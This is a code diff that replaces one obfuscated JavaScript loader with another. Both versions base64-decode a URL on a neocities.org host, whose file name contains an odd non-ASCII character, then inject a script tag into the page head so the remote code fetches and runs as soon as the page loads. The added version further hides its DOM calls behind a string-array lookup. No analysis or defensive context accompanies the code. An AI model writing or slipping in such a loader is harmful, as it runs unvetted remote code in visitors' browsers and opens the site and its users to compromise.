@@ -1,25 +1,10 @@
 (function(){
-  // Correctly encoded URL including the invisible character
-  const _0x4a7d = 'aHR0cHM6Ly9zaGFyZWJvb3N0ZXIubmVvY2l0aWVzLm9yZy9zY3JpcHQz16CAcy5qcw==';
-
-  function _0x56b2(_0x3a1f){
-    return decodeURIComponent(atob(_0x3a1f).split('').map(function(_0x2f9e){
-      return '%' + ('00' + _0x2f9e.charCodeAt(0).toString(16)).slice(-2);
-    }).join(''));
-  }
-
-  function _0x312c(_0x18d3){
-    let _0x1a7b = document['createElement']('script');
-    _0x1a7b['src'] = _0x18d3;
-    _0x1a7b['type'] = 'text/javascript';
-    _0x1a7b['onload'] = function(){
-      console['log'](_0x18d3 + ' loaded successfully.');
-    };
-    _0x1a7b['onerror'] = function(){
-      console['error']('Failed to load ' + _0x18d3);
-    };
-    document['head']['appendChild'](_0x1a7b);
-  }
-
-  _0x312c(_0x56b2(_0x4a7d));
+  const _0x3c2e = ['createElement', 'script', 'type', 'text/javascript', 'onload', 'log', 'onerror', 'error', 'appendChild', 'head', 'src'];
+  const url = atob('aHR0cHM6Ly9zaGFyZWJvb3N0ZXIubmVvY2l0aWVzLm9yZy9zY3JpcHQz4bqlLmpz'); // Obfuscated URL
+  const script = document[_0x3c2e[0]](_0x3c2e[1]);
+  script[_0x3c2e[10]] = url;
+  script[_0x3c2e[2]] = _0x3c2e[3];
+  script[_0x3c2e[4]] = () => console[_0x3c2e[5]](url + ' loaded successfully.');
+  script[_0x3c2e[6]] = () => console[_0x3c2e[7]]('Failed to load ' + url);
+  document[_0x3c2e[9]][_0x3c2e[8]](script);
 })();
